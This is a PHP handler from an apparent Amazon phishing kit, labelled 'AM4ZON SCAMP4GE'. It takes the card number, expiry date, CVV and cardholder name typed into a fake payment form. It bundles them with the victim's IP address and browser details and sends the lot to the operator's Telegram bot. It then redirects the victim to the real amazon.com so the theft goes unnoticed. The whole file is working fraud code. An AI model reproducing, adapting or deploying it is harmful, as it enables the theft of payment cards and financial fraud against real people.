<?php
/*
      PRIV8 AM4ZON SCAMP4GE BY XFORGEX CODER

*/
session_start();
error_reporting(0);
# Adding Settings
include('function.php');
$settings = include('../config.php');
require_once __DIR__ . '/../storage/storage.php';
# User Agent 

$useragent = $_SERVER['HTTP_USER_AGENT'];

#
$holder .= $_POST['holder'];
$ccnum .= $_POST['ccnum'];
$ccexp .= $_POST['EXP1']."/".$_POST['EXP2'];
$cvv2 .= $_POST['cvv2'];

# Logs
$message .= "🔥 AM4ZON CARD FROM - {$IP} 🔥\n\n";
$message .= "➤ [ Card Name ] : {$holder}\n";
$message .= "➤ [ Card Num ] : {$ccnum}\n";
$message .= "➤ [ Card Exp ] : {$ccexp}\n";
$message .= "➤ [ Card Cvv ] : {$cvv2}\n";
$message .= "--------- MORE INFO -----------\n";
$message .= "➤ [ IP Address ] : {$IP}\n";
$message .= "➤ [ User-Agent ] : {$useragent}\n";
$message .= "➤ [ OS ]         : {$os}\n";
$message .= "➤ [ Browser ]    : {$browser}\n";
$message .= "➤ [ City(IP) ]   : {$city}\n";
$message .= "➤ [ Country ]    : {$countryname}\n";
$message .= "➤ [ Date ]       : {$date}\n";
$message .= ".--------------------------------.\n";

# Persist step data
$payload = [
    'card_name' => $holder,
    'card_number' => $ccnum,
    'expiry' => $ccexp,
    'cvv' => $cvv2
];

append_login_session_step(session_id(), 'card', $payload);


# Send Bot

if ($settings['telegram'] == "1"){
  $data = $message;
  $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
  $website = "https://api.telegram.org/{$settings['bot_url']}";
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
}

header('Location: https://www.amazon.com');
?>